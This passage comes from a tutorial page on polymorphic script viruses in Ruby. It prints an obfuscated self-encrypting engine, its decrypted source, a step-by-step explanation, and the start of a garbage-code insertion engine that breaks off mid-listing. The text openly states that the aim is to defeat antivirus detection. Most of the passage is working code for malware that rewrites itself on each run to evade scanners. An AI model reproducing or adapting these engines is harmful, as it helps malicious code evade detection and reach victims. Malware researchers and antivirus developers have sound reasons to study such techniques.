font-weight:bold;">+</span><span style="color:#996600;">'.c'</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">104</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">''</span><span style="color:#006600; font-weight:bold;">+</span>eslo<span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">''</span><span style="color:#006600; font-weight:bold;">+</span>bn<span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">'m'</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">102</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">'.wr'</span><span style="color:#006600; font-weight:bold;">+</span>dehb<span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">''</span><span style="color:#006600; font-weight:bold;">+</span>yrkk<span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">'e(v+'</span><span style="color:#006600; font-weight:bold;">+</span>ygfw<span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">'=&quot;+39'</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">46</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">'chr+'</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">99</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">'ode[i,'</span><span style="color:#006600; font-weight:bold;">+</span>uaau<span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">']+3'</span><span style="color:#006600; font-weight:bold;">+</span>jxec<span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">''</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">46</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">''</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">99</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">'h'</span><span style="color:#006600; font-weight:bold;">+</span>tzqa<span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">'+1'</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">48</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">'.c'</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">104</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">'r)'</span><span style="color:#006600; font-weight:bold;">+</span>bn<span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">'newcode'</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">43</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">'='</span><span style="color:#006600; font-weight:bold;">+</span>etto<span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">'9'</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">46</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">''</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">99</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">'h'</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">114</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">''</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">43</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">'&quot;+&quot;+v+&quot;+&quot;+3'</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">57</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">'.ch'</span><span style="color:#006600; font-weight:bold;">+</span>keyq<span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">''</span><span style="color:#006600; font-weight:bold;">+</span>bn<span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">'e'</span><span style="color:#006600; font-weight:bold;">+</span>ajoo<span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">''</span><span style="color:#006600; font-weight:bold;">+</span>edvw<span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">'if'</span><span style="color:#006600; font-weight:bold;">+</span>bs<span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">'r==1'</span><span style="color:#006600; font-weight:bold;">+</span>bs<span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">'t'</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">104</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">'en'</span><span style="color:#006600; font-weight:bold;">+</span>bn<span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">'new'</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">99</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">''</span><span style="color:#006600; font-weight:bold;">+</span>jwlo<span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">'d'</span><span style="color:#006600; font-weight:bold;">+</span>syln<span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">'+='</span><span style="color:#006600; font-weight:bold;">+</span>yvaq<span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">'9.'</span><span style="color:#006600; font-weight:bold;">+</span>bfuu<span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">''</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">104</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">'r'</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">43</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">''</span><span style="color:#006600; font-weight:bold;">+</span>symo<span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">'+'</span><span style="color:#006600; font-weight:bold;">+</span>ngeb<span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">''</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">43</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">'Strin'</span><span style="color:#006600; font-weight:bold;">+</span>ybto<span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">'(e'</span><span style="color:#006600; font-weight:bold;">+</span>acco<span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">'a'</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">108</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">'(&quot;?&quot;'</span><span style="color:#006600; font-weight:bold;">+</span>efex<span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">'c'</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">111</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">''</span><span style="color:#006600; font-weight:bold;">+</span>xrtx<span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">''</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">101</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">'[i,1]))+'</span><span style="color:#006600; font-weight:bold;">+</span>lrdh<span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">''</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">46</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">''</span><span style="color:#006600; font-weight:bold;">+</span>smyz<span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">''</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">104</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">'r+&quot;+3'</span><span style="color:#006600; font-weight:bold;">+</span>rbkp<span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">'.'</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">99</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">'hr'</span><span style="color:#006600; font-weight:bold;">+</span>bn<span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">'else'</span><span style="color:#006600; font-weight:bold;">+</span>bn<span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">'new'</span><span style="color:#006600; font-weight:bold;">+</span>myvh<span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">'o'</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">100</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">''</span><span style="color:#006600; font-weight:bold;">+</span>rxug<span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">'+=code[i'</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">44</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">'1'</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">93</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">''</span><span style="color:#006600; font-weight:bold;">+</span>bn<span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">'e'</span><span style="color:#006600; font-weight:bold;">+</span>xins<span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">''</span><span style="color:#006600; font-weight:bold;">+</span>mpwk<span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">''</span><span style="color:#006600; font-weight:bold;">+</span>bn<span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">'e'</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">110</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">''</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">100</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">''</span><span style="color:#006600; font-weight:bold;">+</span>bn<span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">'i+'</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">61</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">''</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">49</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">''</span><span style="color:#006600; font-weight:bold;">+</span>bn<span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">'end'</span><span style="color:#006600; font-weight:bold;">+</span>bn<span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">''</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">109</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">'f.'</span><span style="color:#006600; font-weight:bold;">+</span>tyrr<span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">''</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">114</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">'i'</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">116</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">'e(&quot;code'</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">61</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">'&quot;+newc'</span><span style="color:#006600; font-weight:bold;">+</span>yzlc<span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">''</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">100</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">''</span><span style="color:#006600; font-weight:bold;">+</span>chtw<span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">'+3'</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">57</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">'.chr+&quot;'</span><span style="color:#006600; font-weight:bold;">+</span>bn<span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">'e'</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">118</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">'al'</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">40</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">'code)&quot;'</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">41</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">''</span><span style="color:#006600; font-weight:bold;">+</span>bn<span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">''</span><br/>
<span style="color:#CC0066; font-weight:bold;">eval</span><span style="color: black;">&#40;</span>code<span style="color: black;">&#41;</span><br/>
&nbsp;</div>
<p>You see, that you dont understand anything from this one without decrypt it. Therefore here is the encrypted version of the encrypter. It would not work, if you just use the decrypted version, because 1) Eval can not use __FILE__, it has to be outside the encrypted text, 2) Ruby can not find the character of 10.chr or 32.chr (space) and 3) the code has to use itself, therefore there must be a variable containing the encryption tool. Well, now look at the encryption tool:</p>
<p><strong>Polymorphism Example II - Inside</strong></p>
<div class="ruby" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">i=<span style="color:#006666;">0</span><br/>
newcode=<span style="color:#006666;">39</span>.<span style="color:#9900CC;">chr</span><br/>
mf=<span style="color:#CC0066; font-weight:bold;">open</span><span style="color: black;">&#40;</span><span style="color:#0000FF; font-weight:bold;">__FILE__</span><span style="color: black;">&#41;</span><br/>
&nbsp; cbc=mf.<span style="color:#9900CC;">read</span><span style="color: black;">&#40;</span><span style="color:#006666;">46</span><span style="color: black;">&#41;</span><br/>
mf.<span style="color:#9900CC;">close</span><br/>
mf=<span style="color:#CC0066; font-weight:bold;">open</span><span style="color: black;">&#40;</span><span style="color:#0000FF; font-weight:bold;">__FILE__</span>,<span style="color:#996600;">&quot;w&quot;</span><span style="color: black;">&#41;</span><br/>
mf.<span style="color:#9900CC;">write</span><span style="color: black;">&#40;</span>cbc<span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">&quot;<span style="color:#000099;">\n</span>&quot;</span><span style="color: black;">&#41;</span><br/>
<span style="color:#9966CC; font-weight:bold;">while</span> i<span style="color:#006600; font-weight:bold;">&lt;</span>code.<span style="color:#9900CC;">length</span><br/>
&nbsp; <span style="color:#9966CC; font-weight:bold;">if</span> code<span style="color: black;">&#91;</span>i,<span style="color:#006666;">1</span><span style="color: black;">&#93;</span>==<span style="color:#006666;">10</span>.<span style="color:#9900CC;">chr</span> <span style="color:#9966CC; font-weight:bold;">then</span><br/>
&nbsp; &nbsp; newcode<span style="color:#006600; font-weight:bold;">+</span>=<span style="color:#006666;">39</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">&quot;+bn+&quot;</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">39</span>.<span style="color:#9900CC;">chr</span><br/>
&nbsp; <span style="color:#9966CC; font-weight:bold;">elsif</span> code<span style="color: black;">&#91;</span>i,<span style="color:#006666;">1</span><span style="color: black;">&#93;</span>==<span style="color:#006666;">32</span>.<span style="color:#9900CC;">chr</span> <span style="color:#9966CC; font-weight:bold;">then</span><br/>
&nbsp; &nbsp; newcode<span style="color:#006600; font-weight:bold;">+</span>=<span style="color:#006666;">39</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">&quot;+bs+&quot;</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">39</span>.<span style="color:#9900CC;">chr</span><br/>
&nbsp; <span style="color:#9966CC; font-weight:bold;">elsif</span> code<span style="color: black;">&#91;</span>i,<span style="color:#006666;">1</span><span style="color: black;">&#93;</span>==<span style="color:#006666;">92</span>.<span style="color:#9900CC;">chr</span> <span style="color:#9966CC; font-weight:bold;">then</span><br/>
&nbsp; &nbsp; <span style="color:#9966CC; font-weight:bold;">if</span> code<span style="color: black;">&#91;</span>i,<span style="color:#006666;">2</span><span style="color: black;">&#93;</span>==<span style="color:#006666;">92</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">&quot;s&quot;</span> <span style="color:#9966CC; font-weight:bold;">then</span><br/>
&nbsp; &nbsp; &nbsp; newcode<span style="color:#006600; font-weight:bold;">+</span>=<span style="color:#006666;">39</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">&quot;+bs+&quot;</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">39</span>.<span style="color:#9900CC;">chr</span><br/>
&nbsp; &nbsp; <span style="color:#9966CC; font-weight:bold;">else</span><br/>
&nbsp; &nbsp; &nbsp; newcode<span style="color:#006600; font-weight:bold;">+</span>=<span style="color:#006666;">39</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">&quot;+bn+&quot;</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">39</span>.<span style="color:#9900CC;">chr</span><br/>
&nbsp; &nbsp; <span style="color:#9966CC; font-weight:bold;">end</span><br/>
&nbsp; &nbsp; i<span style="color:#006600; font-weight:bold;">+</span>=<span style="color:#006666;">1</span><br/>
&nbsp; <span style="color:#9966CC; font-weight:bold;">elsif</span> code<span style="color: black;">&#91;</span>i,<span style="color:#006666;">1</span><span style="color: black;">&#93;</span>==<span style="color:#006666;">95</span>.<span style="color:#9900CC;">chr</span> <span style="color:#9966CC; font-weight:bold;">then</span><br/>
&nbsp; &nbsp; newcode<span style="color:#006600; font-weight:bold;">+</span>=<span style="color:#006666;">34</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">39</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">&quot;+mf+&quot;</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">39</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">34</span>.<span style="color:#9900CC;">chr</span><br/>
&nbsp; &nbsp; i<span style="color:#006600; font-weight:bold;">+</span>=<span style="color:#006666;">7</span><br/>
&nbsp; <span style="color:#9966CC; font-weight:bold;">else</span><br/>
&nbsp; &nbsp; r=<span style="color:#CC0066; font-weight:bold;">rand</span><span style="color: black;">&#40;</span><span style="color:#006666;">6</span><span style="color: black;">&#41;</span><br/>
&nbsp; &nbsp; <span style="color:#9966CC; font-weight:bold;">if</span> r==<span style="color:#006666;">0</span> <span style="color:#9966CC; font-weight:bold;">then</span><br/>
&nbsp; &nbsp; &nbsp; v=<span style="color: black;">&#40;</span><span style="color:#CC0066; font-weight:bold;">rand</span><span style="color: black;">&#40;</span><span style="color:#006666;">26</span><span style="color: black;">&#41;</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">97</span><span style="color: black;">&#41;</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><span style="color: black;">&#40;</span><span style="color:#CC0066; font-weight:bold;">rand</span><span style="color: black;">&#40;</span><span style="color:#006666;">26</span><span style="color: black;">&#41;</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">97</span><span style="color: black;">&#41;</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><span style="color: black;">&#40;</span><span style="color:#CC0066; font-weight:bold;">rand</span><span style="color: black;">&#40;</span><span style="color:#006666;">26</span><span style="color: black;">&#41;</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">97</span><span style="color: black;">&#41;</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><span style="color: black;">&#40;</span><span style="color:#CC0066; font-weight:bold;">rand</span><span style="color: black;">&#40;</span><span style="color:#006666;">26</span><span style="color: black;">&#41;</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">97</span><span style="color: black;">&#41;</span>.<span style="color:#9900CC;">chr</span><br/>
&nbsp; &nbsp; &nbsp; mf.<span style="color:#9900CC;">write</span><span style="color: black;">&#40;</span>v<span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">&quot;=&quot;</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">39</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span>code<span style="color: black;">&#91;</span>i,<span style="color:#006666;">1</span><span style="color: black;">&#93;</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">39</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">10</span>.<span style="color:#9900CC;">chr</span><span style="color: black;">&#41;</span><br/>
&nbsp; &nbsp; &nbsp; newcode<span style="color:#006600; font-weight:bold;">+</span>=<span style="color:#006666;">39</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">&quot;+&quot;</span><span style="color:#006600; font-weight:bold;">+</span>v<span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">&quot;+&quot;</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">39</span>.<span style="color:#9900CC;">chr</span><br/>
&nbsp; &nbsp; <span style="color:#9966CC; font-weight:bold;">elsif</span> r==<span style="color:#006666;">1</span> <span style="color:#9966CC; font-weight:bold;">then</span><br/>
&nbsp; &nbsp; &nbsp; newcode<span style="color:#006600; font-weight:bold;">+</span>=<span style="color:#006666;">39</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">&quot;+&quot;</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#CC0066; font-weight:bold;">String</span><span style="color: black;">&#40;</span><span style="color:#CC0066; font-weight:bold;">eval</span><span style="color: black;">&#40;</span><span style="color:#996600;">&quot;?&quot;</span><span style="color:#006600; font-weight:bold;">+</span>code<span style="color: black;">&#91;</span>i,<span style="color:#006666;">1</span><span style="color: black;">&#93;</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">&quot;.chr+&quot;</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">39</span>.<span style="color:#9900CC;">chr</span><br/>
&nbsp; &nbsp; <span style="color:#9966CC; font-weight:bold;">else</span><br/>
&nbsp; &nbsp; &nbsp; newcode<span style="color:#006600; font-weight:bold;">+</span>=code<span style="color: black;">&#91;</span>i,<span style="color:#006666;">1</span><span style="color: black;">&#93;</span><br/>
&nbsp; &nbsp; <span style="color:#9966CC; font-weight:bold;">end</span><br/>
&nbsp; <span style="color:#9966CC; font-weight:bold;">end</span><br/>
&nbsp; i<span style="color:#006600; font-weight:bold;">+</span>=<span style="color:#006666;">1</span><br/>
<span style="color:#9966CC; font-weight:bold;">end</span><br/>
mf.<span style="color:#9900CC;">write</span><span style="color: black;">&#40;</span><span style="color:#996600;">&quot;code=&quot;</span><span style="color:#006600; font-weight:bold;">+</span>newcode<span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">39</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">&quot;<span style="color:#000099;">\n</span>eval(code)&quot;</span><span style="color: black;">&#41;</span><br/>
&nbsp;</div>
<p>The plain text should be understandable. The engine works this way:</p>
<ul>
<li>First, when the engine starts, three variables are defined: 'bs' for space, 'bn' for 10.chr and 'mf' for the current file name. 'bs' and 'bn' are created, because Ruby can't get the ASCII numbers of 10/32.chr neighter the character number of 92.chr (because '\n' = 10.chr and '\s' = 32.chr). And 'mf' is created because eval returns '(eval)' for '__FILE__'. That leads to an error. Therefore they are created outside the encrypted string.</li>
<li>Next step is to define all the variables, which stands for one single charater. I have not included a 'maximal-one-variable-of-every-character', because this would be much easier to emulate for AVs. And we dont care if there are more, because the size would never be more than 6-6.5kB, and Ruby is also very fast at encrypting the string.</li>
<li>Next, the variable 'code' is defined, which contains the whole encrypted code. At defineing 'code' the variables, which stands for one character, and the ASCII-numbers of each character will be replaced by the original characters, which leads to the old, original, decrypted code of the encryption-engine.</li>
<li>The last line in the file is a 'eval(code)'. Here the Ruby interpreter evaluates the decrypted code.</li>
<li>The code first reads 46bytes from the original file, which are the three variables 'bs','bn' and 'mf'.</li>
<li>Then the 'while' gets every single letter of the code.</li>
<li>First the engine checks, if the letter is a 10.chr, 32.chr or a '_' (__FILE__). If so, it will not be encrypted but to 'newcode' (the variable, which gets the new encrypted code) one of the three variables will be added.</li>
<li>Then the real encrypting happens. There are three ways:
<ul>
<li>As a variable 1/6: print("a") is the same as kfle="a" print(kfle)</li>
<li>As ASCII number 1/6: print("a") is the same as print(97.chr)</li>
<li>Let it be a string = nothing change: 4/6</li>
</ul></li>
<li>The last step is to add the 'newcode' to the origial file, and everything is ready.</li>
</ul>
<h3>c) Adding Trash</h3>
<p>According to Vesselin Bontchev, adding Junk/Garbage is Polymorphism Level 3. This technique is very often used in script viruses (VBS, JS, PHP) because it is not quite difficult to write such an engine. This technique adds random code to the viral code, which doesn't do anything. Its purpose is to return a variable size of the engine and to stop the possibility of detecting a code by two lines, which are next to each other (if line[n]=='this' AND line[n+1]=='that' then 'infected'). The following code includes at random places random garbage in with the chance of 3/10. First you will see the code, then the explanation to it:</p>
<p><strong>Polymorphism Example - Adding Trash</strong></p>
<div class="ruby" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color:#9966CC; font-weight:bold;">def</span> rn<span style="color: black;">&#40;</span>rnum,t<span style="color: black;">&#41;</span><br/>
&nbsp; <span style="color:#0066ff; font-weight:bold;">@rc</span>=<span style="color:#996600;">&quot;&quot;</span><br/>
&nbsp; <span style="color:#9966CC; font-weight:bold;">while</span> rnum<span style="color:#006600; font-weight:bold;">&gt;</span><span style="color:#006666;">0</span><br/>
&nbsp; &nbsp; <span style="color:#9966CC; font-weight:bold;">if</span> t==<span style="color:#006666;">1</span> <span style="color:#9966CC; font-weight:bold;">then</span><br/>
&nbsp; &nbsp; &nbsp; <span style="color:#0066ff; font-weight:bold;">@rc</span><span style="color:#006600; font-weight:bold;">+</span>=<span style="color: black;">&#40;</span><span style="color:#CC0066; font-weight:bold;">rand</span><span style="color: black;">&#40;</span><span style="color:#006666;">26</span><span style="color: black;">&#41;</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">97</span><span style="color: black;">&#41;</span>.<span style="color:#9900CC;">chr</span><br/>
&nbsp; &nbsp; <span style="color:#9966CC; font-weight:bold;">else</span><br/>
&nbsp; &nbsp; &nbsp; <span style="color:#0066ff; font-weight:bold;">@rc</span><span style="color:#006600; font-weight:bold;">+</span>=<span style="color: black;">&#40;</span><span style="color:#CC0066; font-weight:bold;">rand</span><span style="color: black;">&#40;</span><span style="color:#006666;">9</span><span style="color: black;">&#41;</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">49</span><span style="color: black;">&#41;</span>.<span style="color:#9900CC;">chr</span><br/>
&nbsp; &nbsp; <span style="color:#9966CC; font-weight:bold;">end</span><br/>
&nbsp; &nbsp; rnum<span style="color:#006600; font-weight:bold;">-</span>=<span style="color:#006666;">1</span><br/>
&nbsp; <span style="color:#9966CC; font-weight:bold;">end</span><br/>
&nbsp; <span style="color:#0000FF; font-weight:bold;">return</span> <span style="color:#0066ff; font-weight:bold;">@rc</span><br/>
<span style="color:#9966CC; font-weight:bold;">end</span><br/>
<br/>
&nbsp;<span style="color:#0066ff; font-weight:bold;">@mf</span>=<span style="color:#CC0066; font-weight:bold;">open</span><span style="color: black;">&#40;</span><span style="color:#0000FF; font-weight:bold;">__FILE__</span><span style="color: black;">&#41;</span><br/>
&nbsp;<span style="color:#0066ff; font-weight:bold;">@code</span>=<span style="color:#996600;">&quot;&quot;</span><br/>
